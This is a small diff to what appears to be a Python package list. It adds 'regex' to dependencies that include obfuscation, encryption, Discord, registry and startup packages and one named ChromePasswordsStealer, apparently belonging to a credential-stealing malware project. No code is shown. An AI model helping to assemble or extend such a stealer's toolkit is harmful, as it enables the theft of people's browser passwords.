@@ -8,6 +8,7 @@ startup
 pyImpossibleObf
 tinyaes
 pycryptodome
+regex
 discord
 ChromePasswordsStealer
 winregistry
